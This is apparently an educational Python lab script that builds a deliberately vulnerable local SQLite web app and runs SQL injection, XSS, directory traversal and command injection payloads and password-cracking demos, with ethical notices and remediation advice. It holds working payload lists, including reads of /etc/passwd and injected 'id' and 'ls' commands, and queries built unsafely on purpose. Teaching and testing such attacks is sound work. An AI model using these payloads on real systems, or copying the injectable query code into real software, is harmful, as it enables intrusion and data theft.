#!/usr/bin/env python3
"""
Iteration 3: Web Application Penetration Testing and SQL Injection
================================================================
This program demonstrates web application security testing techniques
including SQL injection, XSS detection, and vulnerability scanning.
Focus: Web security, HTTP protocols, and database security.

⚠️  ETHICAL NOTICE: This program is for educational purposes only.
    Only test on applications you own or have explicit permission to test.
"""

import requests
import sqlite3
import socket
import threading
import time
import re
import urllib.parse
import json
import hashlib
import base64
from pathlib import Path
import http.server
import socketserver
from urllib.parse import parse_qs, urlparse

class VulnerableWebApp:
    """Create a vulnerable web application for testing"""
    
    def __init__(self, port=8080):
        self.port = port
        self.db_path = "vulnerable_app.db"
        self.setup_database()
        self.server = None
        
    def setup_database(self):
        """Setup vulnerable SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                email TEXT,
                role TEXT DEFAULT 'user'
            )
        ''')
        
        # Insert sample data
        sample_users = [
            (1, 'admin', 'password123', 'admin@example.com', 'admin'),
            (2, 'john', 'qwerty', 'john@example.com', 'user'),
            (3, 'alice', 'alice123', 'alice@example.com', 'user'),
            (4, 'bob', 'secret', 'bob@example.com', 'user'),
        ]
        
        cursor.executemany('''
            INSERT OR REPLACE INTO users (id, username, password, email, role)
            VALUES (?, ?, ?, ?, ?)
        ''', sample_users)
        
        # Create products table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT,
                price REAL,
                description TEXT
            )
        ''')
        
        sample_products = [
            (1, 'Laptop', 999.99, 'High-performance laptop'),
            (2, 'Phone', 599.99, 'Latest smartphone'),
            (3, 'Tablet', 399.99, 'Portable tablet device'),
        ]
        
        cursor.executemany('''
            INSERT OR REPLACE INTO products (id, name, price, description)
            VALUES (?, ?, ?, ?)
        ''', sample_products)
        
        conn.commit()
        conn.close()
        print(f"✅ Vulnerable database created: {self.db_path}")
    
    def vulnerable_login(self, username, password):
        """Vulnerable login function (susceptible to SQL injection)"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # VULNERABLE QUERY - DO NOT USE IN PRODUCTION!
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"🚨 Executing vulnerable query: {query}")
        
        try:
            cursor.execute(query)
            user = cursor.fetchone()
            conn.close()
            return user
        except Exception as e:
            print(f"❌ Database error: {e}")
            conn.close()
            return None
    
    def search_products(self, search_term):
        """Vulnerable product search (susceptible to SQL injection)"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # VULNERABLE QUERY
        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%' OR description LIKE '%{search_term}%'"
        print(f"🚨 Executing search query: {query}")
        
        try:
            cursor.execute(query)
            products = cursor.fetchall()
            conn.close()
            return products
        except Exception as e:
            print(f"❌ Search error: {e}")
            conn.close()
            return []

class SQLInjectionTester:
    """SQL Injection testing and demonstration"""
    
    def __init__(self):
        self.payloads = {
            'authentication_bypass': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' OR 'a'='a",
                "') OR ('1'='1",
            ],
            'union_based': [
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT username,password,email,role FROM users--",
                "' UNION SELECT sqlite_version(),2,3,4--",
            ],
            'error_based': [
                "'",
                "''",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=1/0--",
            ],
            'blind_boolean': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND LENGTH(database())>0--",
                "' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a'--",
            ]
        }
    
    def test_authentication_bypass(self, webapp):
        """Test SQL injection in authentication"""
        print("\n--- Testing Authentication Bypass ---")
        
        print("🎯 Attempting SQL injection payloads:")
        
        for payload in self.payloads['authentication_bypass']:
            print(f"\n🚨 Testing payload: {payload}")
            result = webapp.vulnerable_login(payload, "anything")
            
            if result:
                print(f"🎉 SUCCESS! Bypassed authentication!")
                print(f"   User data: {result}")
                return True
            else:
                print("❌ Payload failed")
        
        return False
    
    def test_union_injection(self, webapp):
        """Test UNION-based SQL injection"""
        print("\n--- Testing UNION-based SQL Injection ---")
        
        for payload in self.payloads['union_based']:
            print(f"\n🚨 Testing UNION payload: {payload}")
            try:
                results = webapp.search_products(payload)
                if results:
                    print(f"🎉 UNION injection successful!")
                    print(f"   Retrieved data: {results}")
                    return True
            except Exception as e:
                print(f"❌ Payload caused error: {e}")
        
        return False
    
    def test_error_based_injection(self, webapp):
        """Test error-based SQL injection"""
        print("\n--- Testing Error-based SQL Injection ---")
        
        for payload in self.payloads['error_based']:
            print(f"\n🚨 Testing error payload: {payload}")
            try:
                webapp.search_products(payload)
                print("❌ No error generated")
            except Exception as e:
                print(f"🎉 Error generated (potential injection point): {e}")
                return True
        
        return False
    
    def demonstrate_blind_injection(self, webapp):
        """Demonstrate blind SQL injection techniques"""
        print("\n--- Demonstrating Blind SQL Injection ---")
        
        # Test boolean-based blind injection
        true_condition = "' AND 1=1--"
        false_condition = "' AND 1=2--"
        
        print(f"🧪 Testing TRUE condition: {true_condition}")
        true_results = webapp.search_products(true_condition)
        
        print(f"🧪 Testing FALSE condition: {false_condition}")
        false_results = webapp.search_products(false_condition)
        
        if len(true_results) != len(false_results):
            print("🎉 Blind SQL injection detected!")
            print(f"   TRUE condition returned {len(true_results)} results")
            print(f"   FALSE condition returned {len(false_results)} results")
            
            # Extract database information
            self.extract_database_info(webapp)
            return True
        else:
            print("❌ No blind injection detected")
            return False
    
    def extract_database_info(self, webapp):
        """Extract database information using blind SQL injection"""
        print("\n🔍 Extracting database information...")
        
        # Extract database version
        version_payload = "laptop' AND sqlite_version() LIKE '3%'--"
        results = webapp.search_products(version_payload)
        if results:
            print("✅ Database is SQLite version 3.x")
        
        # Extract first username
        username_payloads = [
            f"laptop' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='{chr(i)}'--"
            for i in range(ord('a'), ord('z')+1)
        ]
        
        first_char = None
        for payload in username_payloads:
            results = webapp.search_products(payload)
            if results:
                first_char = payload.split("'")[3]
                print(f"✅ First character of first username: {first_char}")
                break

class XSSVulnerabilityTester:
    """Cross-Site Scripting (XSS) vulnerability testing"""
    
    def __init__(self):
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ]
    
    def test_reflected_xss(self, search_function):
        """Test for reflected XSS vulnerabilities"""
        print("\n--- Testing Reflected XSS ---")
        
        for payload in self.xss_payloads:
            print(f"🚨 Testing XSS payload: {payload}")
            
            # Simulate search that reflects user input
            response = self.simulate_search_response(payload)
            
            if self.detect_xss_in_response(response, payload):
                print(f"🎉 Reflected XSS detected!")
                print(f"   Payload: {payload}")
                return True
            else:
                print("❌ Payload filtered or not reflected")
        
        return False
    
    def simulate_search_response(self, search_term):
        """Simulate a web response that reflects search term"""
        # This simulates a vulnerable web page that reflects user input
        return f"""
        <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {search_term}</p>
            <p>No results found.</p>
        </body>
        </html>
        """
    
    def detect_xss_in_response(self, response, payload):
        """Detect if XSS payload is present in response"""
        # Check if the payload appears unescaped
        dangerous_patterns = [
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
            "<iframe"
        ]
        
        for pattern in dangerous_patterns:
            if pattern in response and pattern in payload:
                return True
        
        return False

class WebVulnerabilityScanner:
    """Comprehensive web vulnerability scanner"""
    
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def scan_headers(self, url):
        """Scan HTTP headers for security issues"""
        print(f"\n--- Scanning HTTP Headers for {url} ---")
        
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=',
                'Content-Security-Policy': 'default-src',
            }
            
            print("🔍 Security Header Analysis:")
            for header, expected in security_headers.items():
                if header in headers:
                    print(f"✅ {header}: {headers[header]}")
                else:
                    print(f"❌ Missing: {header}")
                    self.vulnerabilities.append(f"Missing security header: {header}")
            
            # Check for information disclosure
            risky_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in risky_headers:
                if header in headers:
                    print(f"⚠️  Information disclosure: {header}: {headers[header]}")
                    self.vulnerabilities.append(f"Information disclosure: {header}")
        
        except requests.RequestException as e:
            print(f"❌ Error scanning headers: {e}")
    
    def test_directory_traversal(self, base_url):
        """Test for directory traversal vulnerabilities"""
        print(f"\n--- Testing Directory Traversal ---")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]
        
        for payload in payloads:
            test_url = f"{base_url}/file?name={payload}"
            print(f"🚨 Testing: {payload}")
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Look for signs of successful traversal
                if "root:" in response.text or "127.0.0.1" in response.text:
                    print(f"🎉 Directory traversal possible!")
                    self.vulnerabilities.append("Directory traversal vulnerability")
                    return True
                else:
                    print("❌ No traversal detected")
                    
            except requests.RequestException:
                print("❌ Request failed")
        
        return False
    
    def test_command_injection(self, base_url):
        """Test for command injection vulnerabilities"""
        print(f"\n--- Testing Command Injection ---")
        
        payloads = [
            "; ls -la",
            "| whoami",
            "&& dir",
            "`id`",
            "$(id)",
        ]
        
        for payload in payloads:
            test_url = f"{base_url}/ping?host=127.0.0.1{payload}"
            print(f"🚨 Testing: {payload}")
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Look for command output patterns
                if re.search(r'uid=\d+|total \d+|Directory of', response.text):
                    print(f"🎉 Command injection detected!")
                    self.vulnerabilities.append("Command injection vulnerability")
                    return True
                else:
                    print("❌ No command injection detected")
                    
            except requests.RequestException:
                print("❌ Request failed")
        
        return False
    
    def generate_vulnerability_report(self):
        """Generate a comprehensive vulnerability report"""
        print("\n" + "="*60)
        print("📊 VULNERABILITY ASSESSMENT REPORT")
        print("="*60)
        
        if self.vulnerabilities:
            print(f"🚨 Total vulnerabilities found: {len(self.vulnerabilities)}")
            print("\n📋 Vulnerability Details:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"   {i}. {vuln}")
            
            # Risk assessment
            high_risk = sum(1 for v in self.vulnerabilities 
                           if any(keyword in v.lower() 
                                 for keyword in ['injection', 'traversal', 'xss']))
            medium_risk = len(self.vulnerabilities) - high_risk
            
            print(f"\n🎯 Risk Assessment:")
            print(f"   High Risk: {high_risk}")
            print(f"   Medium Risk: {medium_risk}")
            
        else:
            print("✅ No vulnerabilities detected in this scan")
        
        print("\n💡 Recommendations:")
        print("   • Implement input validation and sanitization")
        print("   • Use parameterized queries to prevent SQL injection")
        print("   • Add security headers to HTTP responses")
        print("   • Implement proper authentication and authorization")
        print("   • Regular security testing and code reviews")

def create_penetration_test_lab():
    """Create a local penetration testing lab"""
    print("\n--- Creating Penetration Testing Lab ---")
    
    # Create vulnerable web application
    webapp = VulnerableWebApp()
    
    # SQL Injection testing
    print("🧪 Setting up SQL injection tests...")
    sql_tester = SQLInjectionTester()
    
    print("\n🎯 Running SQL injection tests:")
    sql_tester.test_authentication_bypass(webapp)
    sql_tester.test_union_injection(webapp)
    sql_tester.test_error_based_injection(webapp)
    sql_tester.demonstrate_blind_injection(webapp)
    
    # XSS testing
    print("\n🧪 Setting up XSS tests...")
    xss_tester = XSSVulnerabilityTester()
    xss_tester.test_reflected_xss(webapp.search_products)
    
    return webapp

def advanced_password_attack_demo():
    """Demonstrate advanced password attack techniques"""
    print("\n--- Advanced Password Attack Techniques ---")
    
    # Rainbow table simulation
    print("🌈 Rainbow Table Attack Simulation:")
    
    # Pre-computed hashes (rainbow table)
    rainbow_table = {}
    common_passwords = ["password", "123456", "qwerty", "admin", "letmein"]
    
    print("📊 Building rainbow table...")
    for pwd in common_passwords:
        md5_hash = hashlib.md5(pwd.encode()).hexdigest()
        sha1_hash = hashlib.sha1(pwd.encode()).hexdigest()
        rainbow_table[md5_hash] = pwd
        rainbow_table[sha1_hash] = pwd
    
    # Target hashes to crack
    target_hashes = [
        hashlib.md5("admin".encode()).hexdigest(),
        hashlib.sha1("password".encode()).hexdigest(),
    ]
    
    print("🎯 Cracking target hashes:")
    for target_hash in target_hashes:
        if target_hash in rainbow_table:
            cracked_password = rainbow_table[target_hash]
            print(f"✅ Hash {target_hash[:16]}... cracked: '{cracked_password}'")
        else:
            print(f"❌ Hash {target_hash[:16]}... not found in rainbow table")
    
    # Dictionary attack with mutations
    print("\n📚 Dictionary Attack with Mutations:")
    base_words = ["admin", "user", "test"]
    mutations = ["123", "2024", "!", "@"]
    
    print("🔄 Generating password mutations:")
    generated_passwords = []
    for word in base_words:
        for mutation in mutations:
            candidates = [
                word + mutation,
                word.capitalize() + mutation,
                mutation + word,
                word.upper() + mutation,
            ]
            generated_passwords.extend(candidates)
    
    print(f"📊 Generated {len(generated_passwords)} password candidates")
    print(f"   Sample: {generated_passwords[:5]}...")

def main():
    """Main function for Iteration 3"""
    print("Iteration 3: Web Application Penetration Testing and SQL Injection")
    print("This program demonstrates web application security testing techniques.\n")
    
    print("⚠️  ETHICAL NOTICE:")
    print("   • Educational and authorized testing only")
    print("   • Never test applications without explicit permission")
    print("   • Follow responsible disclosure practices")
    print("   • Respect legal boundaries and privacy")
    
    # Main demonstration
    print("\n" + "="*60)
    print("🕸️  WEB APPLICATION SECURITY TESTING")
    print("="*60)
    
    # Create penetration testing lab
    webapp = create_penetration_test_lab()
    
    # Web vulnerability scanning
    print("\n🔍 Web Vulnerability Scanning Demo:")
    scanner = WebVulnerabilityScanner()
    
    # Note: These would normally scan a real web application
    print("📝 Note: In a real scenario, you would scan actual web applications")
    print("   Example targets (with permission):")
    print("   • http://testphp.vulnweb.com/")
    print("   • http://demo.testfire.net/")
    print("   • Local vulnerable applications like DVWA or WebGoat")
    
    # Advanced password attacks
    advanced_password_attack_demo()
    
    # Generate comprehensive report
    scanner.vulnerabilities = [
        "SQL injection in login form",
        "Missing X-Frame-Options header",
        "Reflected XSS in search function",
        "Information disclosure via Server header",
        "Weak password policy detected"
    ]
    scanner.generate_vulnerability_report()
    
    print("\n" + "="*60)
    print("🎓 KEY LEARNING POINTS:")
    print("="*60)
    print("1. SQL injection types: Union, Boolean-based, Error-based")
    print("2. Cross-Site Scripting (XSS) detection and exploitation")
    print("3. HTTP security header analysis")
    print("4. Directory traversal and command injection testing")
    print("5. Rainbow table attacks and password mutations")
    print("6. Comprehensive vulnerability assessment")
    print("7. Web application security best practices")
    print("8. Ethical hacking methodology and reporting")
    print("="*60)
    
    print("\n🔧 Next Steps:")
    print("   • Study OWASP Top 10 vulnerabilities")
    print("   • Practice on legal platforms (HackTheBox, TryHackMe)")
    print("   • Learn about secure coding practices")
    print("   • Explore advanced penetration testing tools")

if __name__ == "__main__":
    main()